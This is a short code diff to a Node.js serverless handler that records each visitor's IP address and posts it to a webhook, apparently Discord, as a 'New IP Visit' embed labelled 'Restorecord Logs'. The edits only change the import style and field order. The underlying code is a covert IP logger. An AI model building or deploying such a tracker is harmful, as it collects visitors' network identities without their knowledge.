@@ -1,4 +1,4 @@
-const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
+const fetch = require("node-fetch");
 
 module.exports = async function handler(req, res) {
   const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress || "IP not found";
@@ -13,8 +13,8 @@ module.exports = async function handler(req, res) {
     body: JSON.stringify({
       embeds: [{
         title: "New IP Visit",
-        color: 0xffcc00,
         description: "```" + `IP Address: ${ip}` + "```",
+        color: 0xffcc00,
         footer: { text: "Restorecord Logs" },
         timestamp: new Date().toISOString()
       }]
